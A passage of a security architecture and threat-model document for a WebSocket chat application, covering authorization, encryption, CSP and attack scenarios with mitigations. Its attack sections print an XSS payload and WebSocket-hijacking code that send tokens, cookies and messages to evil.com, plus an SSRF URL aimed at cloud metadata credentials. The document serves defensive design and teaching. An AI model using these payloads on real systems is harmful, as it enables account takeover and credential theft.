Every WebSocket message handler executes this check:

1. Is the connection authenticated? (connection-level, established at connect)
2. Does the authenticated user have access to the resource in this message?
   - For message.send to conv-789: 
     SELECT 1 FROM conversation_members 
     WHERE conversation_id = 'conv-789' AND user_id = {auth_user_id}
     → This query hits Redis first (cached member set)
3. Does the user have the required role?
   - For admin actions (delete any message, add members):
     SELECT role FROM conversation_members WHERE ...
     → Check role >= 'admin'
4. Is the resource itself valid?
   - Does conv-789 exist? Is it active (not archived/deleted)?
```

**Caching the membership check:** The most frequent auth check (is user a member of conv-X?) is cached in Redis as a Set: `SET conv:{id}:members {user_id1} {user_id2} ...`. SISMEMBER is O(1). This avoids a DB query on every message. The cache is invalidated when a member is added or removed.

### 5.4 Trust Boundaries

```
════════════════════════════════════════════════════════════════════════
ZONE: Untrusted (Public Internet)
  Everything from browsers: WebSocket frames, HTTP requests, cookies
  WebSocket content is end-user controlled — never trust it
  
  Entry: JWT validation converts unverified request to semi-trusted
════════════════════════════════════════════════════════════════════════
ZONE: Semi-trusted (Authenticated User)
  Requests with valid JWT: the user is who they say they are
  But: users can still act maliciously within their permissions
  
  Must still validate: are they a member of the target conversation?
  Must still sanitize: their message content (XSS, injections)
  Entry: Resource-level authorization check
════════════════════════════════════════════════════════════════════════
ZONE: Trusted (Internal Services via mTLS)
  Microservices communicating internally
  Identity established by client certificate, not JWT
  Still must validate inputs (defense in depth)
  
  Entry: Network policy + service mesh authorization
════════════════════════════════════════════════════════════════════════
ZONE: Highly Trusted (Data Stores)
  PostgreSQL, Redis — accept all queries from trusted services
  Protection: network isolation (VPC), no public internet access
  Parameterized queries only (defense against SQL injection from trust zone)
════════════════════════════════════════════════════════════════════════
```

---

## 6. Data Flow

### 6.1 Message Lifecycle: End-to-End Data Journey

```
[Alice's Browser]
      │
      │ WebSocket frame (JSON, UTF-8, masked, text opcode)
      │ { type:"message.send", client_msg_id:"a1b2c3", 
      │   conversation_id:"conv-789", content:"Hello Bob" }
      │
      ▼
[WebSocket Server - Node A]
      │
      ├── Unmask WebSocket frame (XOR with masking key)
      ├── Parse JSON (validate against schema)
      ├── Authenticate: lookup connection → user Alice
      ├── Authorize: Redis SISMEMBER conv:conv-789:members alice_id
      ├── Sanitize: strip HTML, validate UTF-8, check length ≤ 4000 chars
      ├── Assign server message ID (Snowflake)
      ├── Write to PostgreSQL:
      │     INSERT INTO messages (id, conversation_id, sender_id, content, sent_at)
      │     VALUES ($1, $2, $3, $4, NOW())
      │     RETURNING id, sent_at
      ├── Update conversation last_message_at (async, via Kafka)
      ├── Send ACK to Alice:
      │     { type:"message.ack", client_msg_id:"a1b2c3", message_id:"msg-456", sent_at:"..." }
      ├── Publish to Redis Pub/Sub:
      │     PUBLISH conv:conv-789 { type:"message.new", message:{...full message...} }
      └── Publish to Kafka topic "chat.messages":
            { message_id:"msg-456", conversation_id:"conv-789", sender:"alice", ... }

[Redis Pub/Sub - all subscribed nodes receive]
      │
      ├── Node A: Alice's WS already ack'd; other members on Node A get pushed
      ├── Node B: Bob's WS → send frame to Bob
      └── Node C: Carol's WS → send frame to Carol

[Kafka Consumer: Notification Worker]
      │
      ├── Check which conversation members are NOT currently online (no WS connection)
      ├── For offline members: send push notification (APNs, FCM)
      └── For members with email notifications: queue email

[Kafka Consumer: Search Indexer]
      │
      └── Index message content in Elasticsearch for full-text search

[Bob's Browser - receives WebSocket frame]
      │
      ├── Parse frame: { type:"message.new", message:{ id:"msg-456", content:"Hello Bob", ... } }
      ├── Update React state (new message appended to conversation)
      ├── DOM re-renders (virtual DOM diff, minimal DOM operations)
      ├── Browser scrolls to bottom (if user was at bottom)
      └── After message is visible and tab is focused:
            Send: { type:"message.read", message_id:"msg-456", conversation_id:"conv-789" }
```

### 6.2 Serialization Formats and Transformations

| Layer | Format | Notes |
|-------|--------|-------|
| WebSocket wire | JSON (UTF-8, text frames) | Consider MessagePack for 30-40% size reduction |
| Internal services | Protocol Buffers | Typed, compact, backward-compatible |
| Kafka messages | Avro with Schema Registry | Schema evolution tracked centrally |
| PostgreSQL | Row format (internal) | Serialized via driver to application types |
| Redis | MessagePack or JSON string | Depends on client library |
| Search index | Elasticsearch JSON | Analyzed, tokenized for full-text search |
| Push notifications | APNs/FCM JSON | Platform-specific format |
| Client storage (IndexedDB) | JSON or binary | For offline support |

**Why not use JSON everywhere internally?** JSON requires re-parsing on every hop. For a message that passes through 4 services, that's 4 JSON parses and 4 serializations. Protobuf/Avro are binary formats parsed to structs directly — 3-5× faster and 30-50% smaller on the wire.

### 6.3 Message Content Validation Pipeline

```
Raw input: "Hello <script>alert(1)</script> Bob"
                │
                ▼
Step 1: UTF-8 validation
  - Reject sequences that are not valid UTF-8
  - Reject overlong encodings (encoding safety bypass attempts)
  - Reject null bytes (\x00) — can truncate strings in C-based systems
                │
                ▼
Step 2: Length check
  - Max 4000 Unicode code points (not bytes — a single emoji is 4 bytes but 1 code point)
  - This prevents storage exhaustion and UI overflow
                │
                ▼
Step 3: HTML sanitization (if markdown/rich text supported)
  - Parse as markdown, render to safe HTML
  - Use allowlist of HTML tags: <b>, <i>, <a>, <code>, <pre>, <blockquote>
  - Strip all attributes except <a href> (validate href: must be http/https, no javascript:)
  - Output: "Hello &lt;script&gt;alert(1)&lt;/script&gt; Bob" (HTML entities)
  - Or, if plain text only: strip all HTML entirely
                │
                ▼
Step 4: URL extraction and preview (async)
  - Extract URLs from content
  - Fetch URL metadata in background (title, description, image) via Media Service
  - Stored as message metadata, not in content (content is immutable after validation)
                │
                ▼
Step 5: Content moderation (async, Kafka)
  - Pass content to ML-based content moderation service
  - Flagged content queued for human review
  - Severe violations (CSAM detection via PhotoDNA): immediate action
```

---

## 7. Security Controls

### 7.1 Encryption In Transit

| Connection | Protocol | Cipher Suite | Notes |
|-----------|----------|-------------|-------|
| Browser ↔ CDN/LB | TLS 1.3 | AES-256-GCM + X25519 | HSTS enforced, preloaded |
| CDN ↔ Origin | TLS 1.2+ | AES-128-GCM | Internal, not user-facing |
| Service ↔ Service | mTLS 1.3 | AES-256-GCM | Client cert per service |
| Service ↔ PostgreSQL | TLS 1.3 | AES-256-GCM | `sslmode=verify-full` |
| Service ↔ Redis | TLS 1.3 | AES-256-GCM | RESP3 over TLS |
| Service ↔ Kafka | TLS 1.3 + SASL/SCRAM | AES-256-GCM | Per-topic ACLs |

**Forward Secrecy:** TLS 1.3 mandates ephemeral key exchange (ECDHE). Every session uses a fresh ephemeral key pair. If the server's long-term private key is later compromised, previously captured traffic cannot be decrypted. TLS 1.2 with non-DHE cipher suites (RSA key exchange) lacks forward secrecy — capturing traffic now and later stealing the private key decrypts everything.

### 7.2 Encryption At Rest

| Data | Storage | Encryption Method |
|------|---------|------------------|
| Message content | PostgreSQL | TDE (Transparent Data Encryption) at storage level: AES-256 |
| User passwords | PostgreSQL | Argon2id (memory=64MB, iterations=3, parallelism=2) |
| Attachments | S3 | SSE-S3 (AES-256) or SSE-KMS (envelope encryption with AWS KMS) |
| Redis snapshots | EBS | AES-256 disk encryption |
| Refresh tokens | Redis | SHA-256 hash stored, not plaintext |
| Encryption keys | AWS KMS / HashiCorp Vault | HSM-backed, never leave the HSM in plaintext |

**Argon2id parameters explained:**
- `memory=64MB`: The hash computation requires 64MB of RAM. An attacker with a GPU cluster cannot hash millions of passwords in parallel because each attempt needs 64MB of memory.
- `iterations=3`: 3 passes over the memory. Increases time cost.
- `parallelism=2`: Allows 2 parallel threads. On servers with many CPUs, doesn't help attacker with fixed memory.
- The output is a 256-bit hash prefixed with the algorithm and parameters: `$argon2id$v=19$m=65536,t=3,p=2$<salt>$<hash>`.

### 7.3 Input Validation Architecture

Every input boundary enforces validation independently (defense in depth):

```
Browser (client-side validation)
  → Provides UX feedback (char count, disallowed chars)
  → NOT a security control (can be bypassed with curl/DevTools)
  → Purpose: reduce unnecessary server round trips

API Gateway / WebSocket Server (first server-side boundary)
  → Schema validation (JSON schema, Zod, Pydantic)
  → Type coercion and range checks
  → Content-length limits
  → Returns 400 on failure

Business Logic Layer (second server-side boundary)
  → Semantic validation (does this conversation exist? is this user a member?)
  → Content sanitization (HTML stripping, URL validation)
  → Business rule validation (cannot message a blocked user)

Database Layer (last resort, not primary defense)
  → Schema constraints (NOT NULL, length limits, FK constraints)
  → Prevents corrupt data from reaching storage even if above layers fail
```

### 7.4 Content Security Policy (CSP)

Chat applications are particularly vulnerable to XSS because they display user-generated content. A strict CSP is critical:

```
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'nonce-{per-request-random}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' https://media.example.com https://avatars.example.com data:;
  connect-src 'self' wss://chat.example.com https://api.example.com;
  font-src 'self';
  frame-src 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
  report-uri https://csp-reports.example.com/report;
```

**What each directive does:**
- `default-src 'none'`: Block everything by default; allowlist what's needed.
- `script-src 'nonce-{random}'`: Only scripts with a matching nonce (generated per-request, embedded in the HTML) can execute. Inline scripts injected by XSS have no nonce and are blocked.
- `connect-src wss://...`: The WebSocket connection and fetch() calls can only go to your own domain. An XSS payload that tries to exfiltrate data to `evil.com` is blocked.
- `img-src`: Prevents pixel-tracking images loaded from attacker domains that could be used to detect user presence.
- `report-uri`: Any CSP violation is reported to a collection endpoint, alerting you to XSS attempts.

### 7.5 Secrets Handling

```
Secret Type         Storage             Access Pattern          Rotation
──────────────────────────────────────────────────────────────────────────
DB password         Vault               App fetches on start    90 days
Redis password      Vault               App fetches on start    90 days
JWT signing key     KMS (HSM-backed)    Sign/verify API only    180 days
S3 access keys      IAM roles (no key)  IRSA / instance profile N/A
SMTP credentials    Vault               Notification worker     90 days
Kafka creds         Vault + mTLS certs  Per-service certs       1 year
Push notification   Vault               Notification worker     Per platform
  keys (APNs, FCM)
```

**IAM Roles instead of static keys:** Applications running in AWS/GCP/Azure should NEVER store long-lived cloud provider credentials. Instead, use IAM roles assigned to the compute instance/pod. The SDK automatically fetches short-lived credentials from the instance metadata service. Credentials rotate automatically every hour. If a credential is leaked in logs, it expires in < 1 hour.

---

## 8. Attack Surface Mapping

### 8.1 Full Attack Surface Diagram

```
╔══════════════════════════════════════════════════════════════════════════╗
║  EXTERNAL ATTACK SURFACE (Internet-facing)                               ║
╠══════════════════════════════════════════════════════════════════════════╣
║                                                                          ║
║  [A] HTTPS REST API (port 443)                                          ║
║      • Auth endpoints: /api/auth/login, /api/auth/refresh, /api/auth/me ║
║      • Conversation API: /api/conversations/*                            ║
║      • Message API: /api/conversations/{id}/messages                     ║
║      • User API: /api/users/*                                            ║
║      • File upload: /api/attachments                                     ║
║                                                                          ║
║  [B] WebSocket endpoint (wss://chat.example.com/ws)                     ║
║      • Connection phase (pre-auth)                                       ║
║      • All message types post-auth                                       ║
║      • Typing indicators, presence, read receipts                        ║
║                                                                          ║
║  [C] Static asset CDN (cdn.example.com)                                 ║
║      • JavaScript bundles                                                ║
║      • CSS, fonts, icons                                                 ║
║      • Attackable via supply chain (npm packages, CDN compromise)        ║
║                                                                          ║
║  [D] Media endpoints (media.example.com)                                ║
║      • Attachment uploads (multipart form data)                          ║
║      • Attachment downloads (signed S3 URLs)                             ║
║      • Image rendering / thumbnail generation                            ║
║                                                                          ║
║  [E] Browser JavaScript environment                                      ║
║      • Tokens in sessionStorage (XSS accessible)                        ║
║      • DOM manipulation                                                  ║
║      • WebSocket API                                                     ║
║      • Service Worker (intercepts fetch, cache)                          ║
╚══════════════════════════════════════════════════════════════════════════╝

         │ TLS + JWT validation + WAF
         ▼

╔══════════════════════════════════════════════════════════════════════════╗
║  INTERNAL ATTACK SURFACE                                                ║
╠══════════════════════════════════════════════════════════════════════════╣
║                                                                          ║
║  [F] WebSocket Server → Redis                                           ║
║      • Pub/Sub channel injection                                         ║
║      • Connection registry manipulation                                  ║
║                                                                          ║
║  [G] API Server → PostgreSQL                                            ║
║      • SQL injection (if parameterization lapses)                        ║
║      • Excessive privilege (app user with DROP TABLE access)             ║
║                                                                          ║
║  [H] Kafka topics                                                        ║
║      • Topic ACLs (can one service write to another's topic?)            ║
║      • Deserialization attacks on Kafka consumers                        ║
║                                                                          ║
║  [I] Kubernetes API server                                               ║
║      • Overprivileged service accounts                                   ║
║      • Secret enumeration                                                ║
║                                                                          ║
║  [J] Vault / KMS                                                         ║
║      • Excessive policy grants                                           ║
║      • Audit log gaps                                                    ║
║                                                                          ║
║  [K] Internal service mesh                                               ║
║      • mTLS misconfiguration                                             ║
║      • Container escape to host network                                  ║
╚══════════════════════════════════════════════════════════════════════════╝
```

### 8.2 Trust Boundary Map with Attack Paths

```
  Internet ──[A,B,C,D,E]──► API Gateway/LB ──[auth]──► Services
                                                            │
                                              ┌─────────────┼──────────────┐
                                              ▼             ▼              ▼
                                           Redis [F]    PostgreSQL [G]   Kafka [H]
                                              │
                                          Pub/Sub
                                              │
                                     All WS Server Nodes
                                              │
                                          To Clients
                                          
  Attack paths:
  ──────────────
  External → API Gateway:  TLS, JWT, WAF, rate limiting
  API Gateway → Services:  mTLS (each service has its own cert)
  Services → Data stores:  TLS, parameterized queries, least-privilege DB user
  Services → Kafka:        TLS + SASL/SCRAM + topic-level ACLs
  Container → Host:        Seccomp profiles, AppArmor, read-only root FS
  Pod → K8s API:           RBAC, least-privilege service accounts
```

---

## 9. Attack Scenarios (Very Detailed)

### 9.1 Attack: Stored XSS via Message Content

**Attacker assumptions:**
- Attacker is an authenticated user (legitimate account)
- The chat application renders some form of rich text (markdown)
- The server or client does not properly sanitize output

**Step-by-step execution:**

1. Attacker joins a chat group with victims.

2. Attacker sends a crafted message. If the server does not sanitize:
   ```
   Hello everyone! <img src=x onerror="
     fetch('https://evil.com/steal?t=' + 
       encodeURIComponent(sessionStorage.getItem('access_token') || 'empty') +
       '&cookies=' + encodeURIComponent(document.cookie)
     )
   ">
   ```

3. If the client renders this HTML directly (using `innerHTML` or `dangerouslySetInnerHTML` without sanitization), the `onerror` handler fires when the image fails to load.

4. `sessionStorage.getItem('access_token')` retrieves Alice's (the victim's) JWT access token.

5. The `fetch()` sends the token to `evil.com`. The attacker captures Alice's access token.

6. The attacker uses Alice's access token to make API calls as Alice for the next 15 minutes. They can read all of Alice's conversations, send messages as Alice, export contacts.

7. If the attacker can trigger a token refresh (by calling `POST /api/auth/refresh` — but this requires the HttpOnly cookie, which they cannot access via XSS), they cannot extend the session. The 15-minute window is the blast radius.

**Where detection could happen:**
- CSP `connect-src` directive blocks the `fetch()` to `evil.com`
- CSP violation report triggers alert at collection endpoint
- Output sanitization on server prevents the `<img>` tag from being stored or rendered
- Anomaly detection: Alice's token used from a different IP/User-Agent simultaneously
- Client-side Trusted Types policy prevents `innerHTML` assignment of untrusted strings

**Why this works (in vulnerable implementations):**
- React's `dangerouslySetInnerHTML` is deliberately named to warn, but developers use it for markdown rendering
- Libraries like `marked.js` without `sanitize: true` or without a post-process sanitizer like DOMPurify will render raw HTML in markdown
- Even with server-side sanitization, client-side sanitization must also run — the message travels through many hops and could be tampered with

**Mitigation:**
- Server: Strip all HTML from plain text messages. For markdown, parse and render with an allowlist of safe tags only (using `dompurify` or equivalent on the server before storage).
- Client: Use DOMPurify before any `innerHTML` assignment. Better: use a markdown renderer that never produces raw HTML.
- CSP: `connect-src 'self' https://api.example.com` — external fetches blocked.
- Short access token lifetime (15 minutes) limits the window.

---

### 9.2 Attack: WebSocket Connection Hijacking via Missing Origin Check

**Attacker assumptions:**
- The attacker controls a website that the victim visits
- The WebSocket server does not validate the `Origin` header
- The victim is authenticated in their browser (has a valid refresh cookie or access token)

**Step-by-step execution:**

1. Attacker creates `evil.com` with this JavaScript:
   ```javascript
   const ws = new WebSocket('wss://chat.example.com/ws');
   // Browser sends the victim's cookies automatically in the WS upgrade request
   // including the HttpOnly refresh_token cookie
   ws.onopen = () => {
     // Server accepted the connection using victim's cookie
     ws.send(JSON.stringify({
       type: 'auth',
       token: '...'  // attacker needs a token here — see note below
     }));
   };
   ws.onmessage = (event) => {
     // Receive all the victim's messages
     fetch('https://evil.com/collect', { method: 'POST', body: event.data });
   };
   ```

2. The victim visits `evil.com`. The script runs and attempts to open a WebSocket to `chat.example.com`.

3. The browser sends the WebSocket upgrade request. Because cookies are sent with cross-origin WebSocket requests (unlike cross-origin XHR which blocks the body but sends cookies), the victim's `refresh_token` cookie is sent.

4. **Critical question:** Can the attacker use the refresh cookie to authenticate the WebSocket?

   - If the WebSocket uses the first-message auth approach (the client must send a valid access token as the first message), the attacker cannot authenticate — they do not have the access token (only the HttpOnly cookie).
   - If the WebSocket authenticates purely via cookie (bad design), the attacker CAN authenticate.

5. Even if the WS auth fails, the server accepted the TCP+TLS connection. This is a partial resource exhaustion.

**The `Origin` header check:**

The WebSocket upgrade request includes an `Origin` header indicating which page initiated the connection. The server MUST check this:
```
Origin: https://evil.com  ← Server should reject this
Origin: https://chat.example.com  ← Server should accept this
```

Unlike the HTTP `Referer` header, `Origin` is set by the browser and cannot be spoofed by page JavaScript (only by a compromised browser or proxy). If the server checks `Origin`, cross-site WebSocket connection attempts are rejected at the HTTP upgrade phase.

**Where detection could happen:**
- Server rejects WebSocket upgrade due to disallowed `Origin` header
- Rate limiting on upgrade requests from IPs without matching session
- CORS preflight (for REST, not WebSocket) would block cross-origin AJAX

**Mitigation:**
- Server MUST validate `Origin` header against allowlist in WebSocket upgrade handler
- WebSocket authentication must require an access token (not just cookie) as first message
- Use CSRF tokens for sensitive form submissions
- SameSite=Strict on cookies prevents them from being sent cross-origin in modern browsers (but WebSocket upgrade is not a "same-site" navigation in all browsers — Strict is safer than Lax for this reason)

---

### 9.3 Attack: Account Takeover via Refresh Token Theft

**Attacker assumptions:**
- Attacker can perform a MITM or has access to a reverse proxy / log system
- Access tokens are stored in logs (e.g., in the WebSocket URL: `?token=...`)
- OR: the attacker has physical access to the victim's device

**Step-by-step execution:**

1. The application uses the insecure WebSocket authentication approach: `wss://chat.example.com/ws?token=eyJhbGci...`

2. The access token appears in:
   - nginx access logs: `"GET /ws?token=eyJhbGci... HTTP/1.1" 101`
   - CloudFlare logs
   - Chrome DevTools Network tab (visible to anyone with access to the browser)
   - JavaScript error tracking tools (Sentry, Datadog RUM) that capture the full URL

3. An attacker with access to nginx logs (e.g., a sysadmin, or via log pipeline compromise) extracts all tokens.

4. Access tokens expire in 15 minutes, so the attacker must act quickly. But if the attacker has continuous log access, they can extract every token as it's issued.

5. Using the access token, they can call `GET /api/auth/me` to confirm the token is valid, then make any API call the victim could make.

6. **Escalation:** If the application allows password changes with only an access token (not a re-authentication), the attacker can change the victim's password, locking them out.

**Where detection could happen:**
- API calls from different IP address for the same token (IP binding on tokens — impractical due to mobile networks and VPNs)
- Concurrent API calls from two different User-Agents with the same token
- Log aggregation pipeline alerts on token values appearing in URLs

**Why this works:** Tokens in URLs is a well-known anti-pattern documented in OAuth 2.0 security best practices (RFC 9700). But it persists because the browser's WebSocket API provides no other mechanism in many implementations.

**Mitigation:**
- Use the short-lived WebSocket ticket approach (Approach C in Section 5.2)
- Scrub tokens from all logs (nginx `log_format` can redact query parameters)
- Store access tokens in memory only, never in URLs
- Monitor for concurrent use of the same token from different IPs/User-Agents

---

### 9.4 Attack: Message Injection via Race Condition in Authorization Check

**Attacker assumptions:**
- Attacker was a member of a private conversation but has since been removed
- The authorization check uses a Redis cache with a non-zero TTL
- The attacker can send messages within the cache TTL window after being removed

**Step-by-step execution:**

1. Alice and Mallory are members of a private group conversation `conv-secret`.

2. Alice (admin) removes Mallory from the conversation. The server:
   - Updates the DB: DELETE FROM conversation_members WHERE user_id = mallory AND conversation_id = 'conv-secret'
   - Invalidates the Redis cache key `conv:conv-secret:members`
   - Sends Mallory a "you've been removed" WS message

3. **Race condition / cache invalidation gap:** If the cache invalidation fails (Redis unreachable for 50ms), or if there's a replication lag between the write path and the Redis cache, the cache might still contain Mallory as a member for up to TTL seconds (e.g., 600 seconds).

4. If Mallory quickly sends a message after being removed but before the cache updates, the authorization check (Redis SISMEMBER) returns true (Mallory is still in the cached member set), and the message is delivered to the conversation.

5. Alternatively: Mallory keeps her WebSocket connection open after being removed (the server removed her from the DB but didn't force-close her WebSocket). She can continue sending messages until her connection is explicitly invalidated.

**Where detection could happen:**
- DB-level authorization (always check DB, not just cache) before writes
- Monitoring for members sending messages after being removed
- Explicit WebSocket connection revocation when a user is removed from a conversation

**Why this works:** Caching membership data for performance creates an inconsistency window. The "remove from room" operation must be atomic across DB + cache + active WebSocket connections.

**Mitigation:**
- On member removal: DB delete + Redis SREM + push "revoked" message to the user's WebSocket connection + add `conv:{id}:user:{id}:revoked` key to Redis with TTL > cache TTL (so all subsequent cache refreshes also see revocation)
- For writes: always check DB (not cache) before writing a message — cache is only for reads
- Use Redis transactions (MULTI/EXEC) for atomic cache operations
- WebSocket server subscribes to a "revocation" channel and forcibly closes the affected user's connection for the specific conversation

---

### 9.5 Attack: Denial of Service via Expensive Message Operations

**Attacker assumptions:**
- Attacker has a valid account
- The system allows searching message history (Elasticsearch)
- Search queries are not rate-limited or complexity-limited

**Step-by-step execution:**

1. Attacker identifies the search endpoint: `GET /api/conversations/conv-789/messages/search?q=a*a*a*`

2. The query `a*a*a*` is a regex-like pattern that causes catastrophic backtracking in the search engine's regex evaluation — this is a ReDoS (Regular Expression Denial of Service) if the search backend evaluates it naively.

3. Alternatively: the attacker sends a search query with very common terms across a large conversation with millions of messages. Elasticsearch must scan, score, and return results from a massive dataset.

4. If the search service shares infrastructure with the message delivery service, the CPU exhaustion on search degrades real-time message delivery for all users.

5. Attacker runs 100 concurrent search requests. Elasticsearch thread pool exhausts. Search returns 503. Queries queue up. Heap exhausts. OOM kill.

**Where detection could happen:**
- Per-user rate limit on search (e.g., 10 queries/minute)
- Circuit breaker on search service: if latency exceeds 2 seconds, return 503 immediately rather than queuing
- Elasticsearch query complexity limits (max_clauses, timeout parameter)
- CPU monitoring alerts when search nodes exceed 80% utilization

**Mitigation:**
- Rate limit search: 10 queries/minute/user (Redis counter)
- Set `timeout` on all Elasticsearch queries: `{ "timeout": "2s" }` — partial results returned, not blocked execution
- Use `query_string` query with complexity limits, not regex queries
- Separate Elasticsearch cluster for search from message delivery (no shared resources)
- Circuit breaker (Hystrix/Resilience4j): fail fast if downstream is slow

---

### 9.6 Attack: Server-Side Request Forgery (SSRF) via Link Preview

**Attacker assumptions:**
- The chat system generates link previews (fetching URL metadata when a URL is posted)
- The link preview fetcher runs server-side and is not restricted to public IPs

**Step-by-step execution:**

1. Attacker sends a message containing: `Check this out: http://169.254.169.254/latest/meta-data/iam/security-credentials/`

2. The message processing pipeline extracts the URL and passes it to the link preview service for metadata fetching (title, description, image).

3. The link preview service makes an HTTP GET request to `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. This is the AWS EC2 instance metadata service — accessible from any code running on an EC2 instance, returning the AWS IAM credentials for that instance's role.

4. The response contains:
   ```json
   {
     "AccessKeyId": "ASIA...",
     "SecretAccessKey": "...",
     "Token": "...",
     "Expiration": "2024-01-01T12:00:00Z"
   }
   ```

5. The link preview service stores this as the link preview metadata, and potentially returns it to the attacker's client as the preview content.

6. The attacker now has AWS credentials for the EC2 instance role. Depending on the role's permissions: read S3 buckets (all chat attachments), access RDS (PostgreSQL), call other AWS services.

**Where detection could happen:**
- Egress firewall blocking requests to 169.254.169.254
- IMDSv2 (Instance Metadata Service v2) requires a PUT request to get a token first — simple GET requests fail (this is a mitigation, not detection)
- Network monitoring detects outbound requests to link-local addresses
- WAF rule blocking 169.254.169.254 in request bodies

**Why this works:** The link preview service trusts the URL in the message content. It makes an HTTP request on behalf of the user without validating that the URL resolves to a public internet IP. RFC 1918 (10.x.x.x, 172.16.x.x, 192.168.x.x) and link-local (169.254.x.x) addresses are reachable from servers but are not user-accessible.

**Mitigation:**
- Resolve the URL to an IP before fetching. Check the IP against a deny list of private, loopback, link-local, and cloud metadata ranges.
- Make link preview fetches from a separate, isolated network namespace with no access to internal services or AWS metadata.
- Use IMDSv2 — requires session-oriented PUT request first; simple GET to 169.254.169.254 fails.
- Set egress firewall rules: deny outbound to 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16 from the link preview service.
- Allow only HTTP/HTTPS (not file://, dict://, gopher:// which can access other internal services).

---

## 10. Failure Points

### 10.1 Failures Under Load

**WebSocket server — file descriptor exhaustion:**
- Each WebSocket connection is an open file descriptor (socket). Linux default `ulimit -n = 1024`. Production: `1,048,576`.
- Symptom: New connections refused with `EMFILE` error. Existing connections unaffected.
- Diagnosis: `ss -s` shows connection counts; `cat /proc/{pid}/limits` shows FD limit.
- Fix: Set `LimitNOFILE=1048576` in the systemd unit file; `sysctl -w net.core.somaxconn=65536`.

**Redis Pub/Sub — message lag under fan-out:**
- Large group chats with many subscribers create a slow consumer problem. If any subscriber's buffer fills (because the WS server can't push fast enough), Redis applies backpressure or drops messages (depending on `client-output-buffer-limit`).
- Symptom: Messages delivered to some users but not others; increasing Redis `blocked_clients` metric.
- Fix: Tune `client-output-buffer-limit pubsub 256mb 64mb 60`; implement overflow handling in WS server.

**PostgreSQL — write amplification in large groups:**
- When 1000 members read a message, updating `read_receipts` for each causes 1000 write operations.
- Symptom: Write IOPS spike, replication lag increases, read replicas fall behind.
- Fix: Batch read receipt updates (accumulate for 500ms, then batch write); use `UPDATE ... WHERE read_at IS NULL` to deduplicate; consider separate time-series DB for read receipts.

**Kafka consumer lag:**
- If the notification worker is slow (external push notification API is slow), Kafka consumer lag grows. Users receive push notifications with increasing delay. Eventually lag grows to minutes or hours.
- Symptom: `kafka.consumer.group.lag` metric rising; push notifications arriving very late.
- Fix: Increase consumer group parallelism (more partitions = more consumers); implement separate slow lane (email) vs fast lane (push); circuit breaker on external push API.

### 10.2 Failures Under Attack

**WebSocket connection flood:**
- Attacker opens 1,000,000 unauthenticated WebSocket connections (uses pre-auth window). Each holds file descriptor + memory (kernel socket buffers: ~8KB each). 1M connections × 8KB = 8GB kernel memory.
- If authentication timeout is 30 seconds per connection, and the server can accept 100,000 connections/second, attacker needs 10 seconds to saturate.
- Mitigation: Maximum concurrent unauthenticated connections per IP (10); global unauthenticated connection limit; Fail2ban on IPs exceeding thresholds.

**JWT validation CPU exhaustion:**
- RS256 JWT verification involves RSA modular exponentiation. At 100,000 requests/second, each requiring signature verification, CPU is dominated by crypto. A single 2 vCPU machine can do ~50,000 RS256 verifications/second.
- Fix: Cache validated tokens in Redis with TTL matching token expiry. After first verification, subsequent requests get `cache hit: valid` without re-verifying RSA signature. Use token fingerprint (SHA-256 of token) as the cache key.

**Message content bomb (large payload):**
- Attacker sends a 100MB WebSocket frame (by setting the payload length field). Server begins buffering this frame in memory before processing it.
- 10 attacker connections × 100MB = 1GB server memory consumed.
- Fix: Enforce `max_frame_size = 64KB` in the WebSocket server configuration. Frames exceeding this are rejected and the connection is closed.

### 10.3 Common Misconfigurations

| Misconfiguration | Impact | How to Detect |
|-----------------|--------|---------------|
| `Origin` header not checked on WS upgrade | Cross-site WebSocket hijacking | Penetration test, code review |
| Access token in WebSocket URL query param | Token leakage in logs | Security code review, log audit |
| `SameSite=Lax` instead of `Strict` on refresh cookie | CSRF-assisted cookie use | Cookie audit |
| Redis without TLS (`requirepass` only) | Token data exposed to network observer | Infrastructure audit |
| `sslmode=disable` on PostgreSQL connection string | DB data unencrypted in transit | Config audit |
| S3 bucket public (attachments) | All uploaded files publicly accessible | AWS Config rule, s3scanner |
| Shared Redis instance for cache and rate limiting | Rate limit counters can be poisoned by cache operations | Architecture review |
| JWT `exp` set to 24 hours | Revocation window is 24 hours (stolen token valid for a day) | JWT audit |
| Markdown renderer without HTML allowlist | Stored XSS | DAST scan, code review |
| `X-Content-Type-Options: nosniff` missing | MIME confusion attacks | Security headers scan (securityheaders.com) |

---

## 11. Mitigations

### 11.1 Defense-in-Depth Architecture

```
Layer 1: Network perimeter
────────────────────────────
• DDoS mitigation (Cloudflare L3/L4 scrubbing)
• Rate limiting at edge (Cloudflare Rules: 100 req/min per IP)
• Geo-blocking (optional, for compliance)
• IP reputation blocking (Cloudflare Threat Intelligence)

Layer 2: Application Gateway
────────────────────────────
• WAF rules (OWASP Core Rule Set + custom rules for WebSocket abuse)
• TLS 1.3 only, HSTS preloaded
• Bot detection (JS challenge for suspicious patterns)
• Per-endpoint rate limits (Redis sliding window)
• JWT signature verification + claim validation

Layer 3: WebSocket / API Server
────────────────────────────
• Origin header validation (allowlist)
• Max frame size enforcement (64KB)
• Message rate limiting per connection (100/second)
• Content validation and sanitization on receipt
• Resource-level authorization before every state change
• Input schema validation (reject on first failure, don't try to fix)

Layer 4: Business Logic
────────────────────────────
• Membership checks against DB (not just cache) for write operations
• Content moderation pipeline
• Audit trail for all admin actions
• Re-authentication required for sensitive operations (password change, payment)

Layer 5: Data Layer
────────────────────────────
• Parameterized queries only
• Least-privilege DB users (app user: SELECT, INSERT, UPDATE; no DDL, no DELETE on users table)
• Encrypted connections (TLS) to all data stores
• Automated backups + point-in-time recovery
• Read replicas isolated from write path

Layer 6: Infrastructure
────────────────────────────
• mTLS between all services
• Network policies (pods cannot talk to pods they don't need to)
• Read-only root filesystem for containers
• Seccomp profiles (whitelist syscalls)
• Secrets from Vault (never in environment variables baked into images)
• Immutable infrastructure (containers not SSH'd into)

Layer 7: Detection & Response
────────────────────────────
• Centralized logging with tamper-evident storage
• SIEM with anomaly detection rules
• Incident response runbooks
• Automated token revocation on suspicious activity
```

### 11.2 Specific Fix: Message Fan-out for Large Groups

**Problem:** 100,000-member channels cannot be delivered to via individual WebSocket pushes.

**Solution: Tiered delivery**

```
0–100 members: Push to all via Redis Pub/Sub (real-time, sub-second)
